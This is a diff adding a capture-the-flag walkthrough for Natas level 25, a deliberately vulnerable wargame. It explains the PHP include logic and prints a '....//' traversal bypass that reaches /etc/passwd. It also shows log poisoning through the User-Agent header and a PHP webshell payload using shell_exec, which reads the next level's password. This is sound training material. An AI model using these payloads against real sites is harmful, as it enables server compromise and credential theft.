@@ -84,6 +84,84 @@ function logRequest($message){
 
 ## Solution
 
-After going through the text, lets find password for the next Level.
-Below is the Breakdown of Backend code.
+Lets shift focus from awesomeness of the presented quote to finding password for the next Level.
 
+Below is the Breakdown of relevant functions in Backend code.
+
+  - `setLanguage()`
+        This function checks if `lang` parameter exists in our request and then includes that file using `safeinclude()`.
+        If not present, default file to include is `language/en`
+        
+  - `safeinclude()`
+        * checks for Directory Traversal attacks, it finds and removes `../` with empty string.
+        * It also exits, when attempt is made to retrieve password file for next level (`/etc/natas_webpass/natas26`)
+        * if above two checks are passed, it includes the file
+
+  - `logRequest()`
+        * This function logs error when `safeinclude` functions finds attack attempts
+        * Notice that it directly embeds the clients `USER_AGENT` string in the log file. This can come handy later.
+        * We have path of log file as `/var/www/natas/natas25/logs/natas25_<SESSIONID>.log`
+
+
+Lets get to work now.
+
+First i tried with the usual directory traversals and got no luck (this was expected)
+
+![](./images/Level25_solution.png)
+
+After a while it turned to my local machine to test various PHP functions, below is the session log
+
+First i wanted to see how `strstr` function works. `strstr` function finds first occurence of a string and returns the whole string starting from that occurence
+
+```php
+echo strstr('hello/../../../etc/passwd/../', '../');   # Output : ../../../etc/passwd/../
+```
+
+Next, lets see `str_replace` . It Replaces all occurrences of the search string with the replacement string.
+```php
+echo str_replace('../', '', '../../../../etc/passwd');  # Output : etc/passwd
+```
+
+Then i looked at if somehow i can bypass these functions, and it turns out that yes, it could be done.
+
+See Below session
+
+```php
+# I tried different things to bypass str_relace functions and finally came up with this payload
+echo str_replace('../', '', '....//....//....//....//etc/passwd');  # Output : ../../../../etc/passwd
+```
+
+So now, after `str_replace()` function runs, we can still slip in `../` characters and do Directory Traversal attack.
+
+Below, we use this to see a file that we know exists -> `/var/www/natas/natas25/logs/natas25_<SESSIONID>.log`
+
+![](./images/Level25.1_solution.png)
+
+Above we have successfully conducted Directory Traversal attack, but still can't display password containing file `/etc/natas_webpass/natas26` becuase of the code logic.
+
+We will now poison the log file with our webshell using the `User-Agent` header (handy!) and see if this works.
+
+Webshell payload:
+```php
+<?php echo '<pre>' . shell_exec($_GET[ 'cmd']) . '</pre>';?>
+```
+
+![](./images/Level25.2_solution.png)
+
+
+Now we have command execution, lets reveal the password for next Level
+
+![](./images/Level25.3_solution.png)
+
+<br/>
+<span id=green>**Takeaway**</span><br/>
+
+  - 
+  - 
+
+<br/>
+This one was satisfying to do
+
+<br/>
+
+[<< Back](https://grey-fish.github.io/Natas/index.html)
